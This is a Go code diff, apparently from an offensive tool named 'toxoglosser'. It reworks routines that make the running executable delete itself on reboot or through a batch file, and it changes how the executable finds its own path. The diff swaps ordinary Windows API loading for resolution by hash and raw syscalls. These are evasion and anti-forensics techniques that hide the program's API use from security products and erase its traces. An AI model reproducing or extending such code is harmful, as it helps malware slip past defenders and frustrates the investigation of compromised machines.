@@ -2,10 +2,15 @@ package utils
 
 import (
 	"golang.org/x/sys/windows"
+	"syscall"
 	"unsafe"
+	"toxoglosser/common"
 )
 
-// SelfDelete attempts to delete the current executable
+// SelfDelete attempts to delete the current executable.
+// This function marks the current executable for deletion on the next system reboot
+// using the MoveFileExW API with the MOVEFILE_DELAY_UNTIL_REBOOT flag.
+// This is done to avoid issues that can occur when trying to delete the currently running executable.
 func SelfDelete() error {
 	// Get the current executable path
 	executablePath, err := GetExecutablePath()
@@ -13,13 +18,48 @@ func SelfDelete() error {
 		return err
 	}
 
-	// Get kernel32 handle and MoveFileEx function
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procMoveFileEx := kernel32.NewProc("MoveFileExW")
+	// Manually resolve MoveFileExW function
+	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+		procMoveFileEx := kernel32.NewProc("MoveFileExW")
 
-	// Use MoveFileEx with MOVEFILE_DELAY_UNTIL_REBOOT flag to delete on next reboot
-	// This is safer than immediate deletion which can cause issues
-	ret, _, err1 := procMoveFileEx.Call(
+		ret, _, err1 := procMoveFileEx.Call(
+			uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
+			0, // NULL destination (delete)
+			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
+		)
+
+		if ret == 0 {
+			return err1
+		}
+
+		return nil
+	}
+
+	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "MoveFileExW")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+		procMoveFileEx := kernel32.NewProc("MoveFileExW")
+
+		ret, _, err1 := procMoveFileEx.Call(
+			uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
+			0, // NULL destination (delete)
+			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
+		)
+
+		if ret == 0 {
+			return err1
+		}
+
+		return nil
+	}
+
+	// Actually call the function via raw syscall
+	ret, _, err1 := syscall.SyscallN(
+		addr,
 		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(executablePath))),
 		0, // NULL destination (delete)
 		uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
@@ -47,16 +87,56 @@ func SelfDeleteImmediate() error {
 
 	// For this implementation, we'll use MoveFileEx to rename the file to an invalid name
 	// and mark it for deletion
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procMoveFileEx := kernel32.NewProc("MoveFileExW")
-	
-	// We'll try to move the file to a temp location marked for deletion
-	// First, get a handle to the executable with delete access
-	// Then use the MOVEFILE_DELAY_UNTIL_REBOOT flag to ensure deletion on restart
-	
+	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+		procMoveFileEx := kernel32.NewProc("MoveFileExW")
+
+		executablePtr := windows.StringToUTF16Ptr(executablePath)
+
+		ret, _, _ := procMoveFileEx.Call(
+			uintptr(unsafe.Pointer(executablePtr)),
+			0, // NULL - indicates delete
+			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
+		)
+
+		if ret == 0 {
+			// If we can't schedule for delete on reboot, try a different approach
+			// by using a batch file to delete after exit
+			return createSelfDeleteBatch(executablePath)
+		}
+
+		return nil
+	}
+
+	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "MoveFileExW")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		kernel32 := windows.NewLazySystemDLL("kernel32.dll")
+		procMoveFileEx := kernel32.NewProc("MoveFileExW")
+
+		executablePtr := windows.StringToUTF16Ptr(executablePath)
+
+		ret, _, _ := procMoveFileEx.Call(
+			uintptr(unsafe.Pointer(executablePtr)),
+			0, // NULL - indicates delete
+			uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
+		)
+
+		if ret == 0 {
+			// If we can't schedule for delete on reboot, try a different approach
+			// by using a batch file to delete after exit
+			return createSelfDeleteBatch(executablePath)
+		}
+
+		return nil
+	}
+
+	// Actually call the function via raw syscall
 	executablePtr := windows.StringToUTF16Ptr(executablePath)
-	
-	ret, _, _ := procMoveFileEx.Call(
+	ret, _, _ := syscall.SyscallN(
+		addr,
 		uintptr(unsafe.Pointer(executablePtr)),
 		0, // NULL - indicates delete
 		uintptr(windows.MOVEFILE_DELAY_UNTIL_REBOOT),
@@ -71,12 +151,49 @@ func SelfDeleteImmediate() error {
 	return nil
 }
 
-// GetExecutablePath returns the current executable path
+// GetExecutablePath returns the current executable path.
+// Uses the GetModuleFileNameW API to retrieve the full path of the currently running executable.
 func GetExecutablePath() (string, error) {
 	var buffer [windows.MAX_PATH]uint16
-	procGetModuleFileName := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleFileNameW")
-	
-	ret, _, err := procGetModuleFileName.Call(
+	hKernel32, err := common.GetModuleHandleByHash("kernel32.dll")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		procGetModuleFileName := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleFileNameW")
+
+		ret, _, err := procGetModuleFileName.Call(
+			0, // Current module (exe)
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(len(buffer)),
+		)
+
+		if ret == 0 {
+			return "", err
+		}
+
+		return windows.UTF16ToString(buffer[:]), nil
+	}
+
+	addr, err := common.GetProcAddressByHash(windows.Handle(hKernel32), "GetModuleFileNameW")
+	if err != nil {
+		// Fallback to LazyDLL if manual resolution fails
+		procGetModuleFileName := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetModuleFileNameW")
+
+		ret, _, err := procGetModuleFileName.Call(
+			0, // Current module (exe)
+			uintptr(unsafe.Pointer(&buffer[0])),
+			uintptr(len(buffer)),
+		)
+
+		if ret == 0 {
+			return "", err
+		}
+
+		return windows.UTF16ToString(buffer[:]), nil
+	}
+
+	// Actually call the function via raw syscall
+	ret, _, err := syscall.SyscallN(
+		addr,
 		0, // Current module (exe)
 		uintptr(unsafe.Pointer(&buffer[0])),
 		uintptr(len(buffer)),
